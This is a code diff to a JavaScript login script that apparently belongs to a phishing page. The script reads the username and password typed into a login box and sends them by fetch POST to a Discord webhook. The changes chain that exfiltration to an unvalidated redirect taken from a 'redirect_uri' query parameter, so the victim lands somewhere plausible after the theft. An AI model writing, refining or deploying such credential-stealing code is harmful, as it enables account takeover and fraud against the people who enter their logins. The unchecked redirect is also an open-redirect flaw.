@@ -1,9 +1,25 @@
 function login() {
-  const username = document.getElementById('username').value;
-  const password = document.getElementById('password').value;
+  const username = document.querySelector('.login-box input[type="text"]').value;
+  const password = document.querySelector('.login-box input[type="password"]').value;
 
   // Send login information to Discord webhook
-  sendToDiscordWebhook(username, password);
+  sendToDiscordWebhook(username, password)
+    .then(response => {
+      // Get the redirect URL from the query parameter
+      const urlParams = new URLSearchParams(window.location.search);
+      const redirectUrl = urlParams.get('redirect_uri');
+
+      // Redirect the user to the provided URL
+      if (redirectUrl) {
+        window.location.href = redirectUrl;
+      } else {
+        // If no redirect URL is provided, redirect to a default page
+        window.location.href = 'index.html';
+      }
+    })
+    .catch(error => {
+      console.error('Error sending login information to Discord webhook:', error);
+    });
 }
 
 function sendToDiscordWebhook(username, password) {
@@ -15,17 +31,11 @@ function sendToDiscordWebhook(username, password) {
   };
 
   // Send the data to the Discord webhook
-  fetch(webhookUrl, {
+  return fetch(webhookUrl, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
     },
     body: JSON.stringify(data)
-  })
-  .then(response => {
-    console.log('Login information sent to Discord webhook:', response.status);
-  })
-  .catch(error => {
-    console.error('Error sending login information to Discord webhook:', error);
   });
 }
